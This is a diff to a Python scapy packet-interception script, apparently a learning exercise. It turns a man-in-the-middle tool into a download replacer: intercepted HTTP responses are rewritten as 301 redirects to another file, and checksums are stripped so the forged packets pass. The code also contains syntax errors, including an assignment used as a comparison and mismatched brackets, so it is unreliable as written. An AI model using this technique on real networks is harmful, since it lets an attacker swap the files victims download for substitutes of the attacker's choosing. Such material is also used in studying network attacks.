@@ -45,8 +45,19 @@ def process_packet(packet):
         elif scapy_packet[scapy.TCP].sport = 80: #if this exists, packet is HTTP response inbound
             if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
                 print("++Replacing file")
+                if scapy_packet[scapy.TCP].seq in ack_list:
+                    ack_list.remove(scapy_packet[scapy.TCP].seq) #remove from list since it's no
+                    #longer needed once it's printed
+                    scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://testhtml5.vulnweb.com/static/img/logo2.png"
+                    #modify load response to fake that resource has been moved to another location
+                    #the load field in scapy is a string so this will work without modification
+                    del scapy_packet(scapy.IP].len
+                    del scapy_packet(scapy.IP].chksum
+                    del scapy_packet(scapy.TCP].chksum
+                    #remove checksum fields so packets won't be corrupted
+                    #scapy auotmatically regenerates them
                 #print("\nHTTP Response inbound found:\n")
-                print(scapy_packet.show())
+                #print(scapy_packet.show())
             
         #print(scapy_packet.show()) #print out any packet with a RAW layer;
         #this will show packets that have HTTP requests, so it can be narrowed
